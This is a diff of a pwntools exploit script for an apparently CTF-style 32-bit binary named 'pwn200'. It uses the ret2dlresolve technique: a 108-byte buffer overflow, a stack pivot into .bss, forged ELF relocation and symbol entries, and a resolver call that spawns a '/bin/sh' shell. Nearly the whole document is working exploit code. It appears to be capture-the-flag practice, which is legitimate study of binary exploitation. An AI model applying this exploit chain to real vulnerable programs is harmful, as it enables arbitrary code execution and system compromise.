@@ -1,26 +1,27 @@
 from pwn import *
+# ret2dlresolve
 context.arch="i386"
-elf = ELF('./pwn200')
-gadget = lambda x: next(elf.search(asm(x, os='linux', arch='i386')))
 p = process('./pwn200')
-stack_privot  = gadget("leave; ret")
+elf = p.elf
+gadget = lambda x: next(elf.search(asm(x, os='linux', arch='i386')))
+
+stack_pivot  = gadget("leave; ret")
 
 bss = 0x0804c028+0x600 - 8
-read_plt = 0x080490A4
-
+read_plt = elf.plt['read']
 p.send(b"A"*108 + b''.join(p32(i) for i in [bss, # ebp
                                             read_plt,  # call read
-                                            stack_privot, # leave; ret
+                                            stack_pivot, # leave; ret
                                             0, bss, 0x400
                                             ]))
 
-ELF32_sym = 0x8048248
+dynsym = 0x8048248
 dynstr = 0x80482e8
 rel_plt = 0x080483a0
 resolve_plt = 0x8049030
 fake_ptr = bss + 0x200
 
-r_info =  (((fake_ptr + 8 - ELF32_sym))//0x10)*0x100 + 0x7
+r_info =  (((fake_ptr + 8 - dynsym))//0x10)*0x100 + 0x7
 
 # typedef struct
 # {
@@ -47,5 +48,6 @@ fake_bin_sh = fake_ptr + len(fake_Elf32_Rel) + len(fake_Elf32_Sym) + 7
 
 rop_chain = b''.join(p32(i) for i in [0, resolve_plt, fake_rel_offset, 0, fake_bin_sh]).ljust(0x200, b'\x00')
 
+# b *0x8049030
 p.send(rop_chain + fake_Elf32_Rel + fake_Elf32_Sym + strings)
 p.interactive()
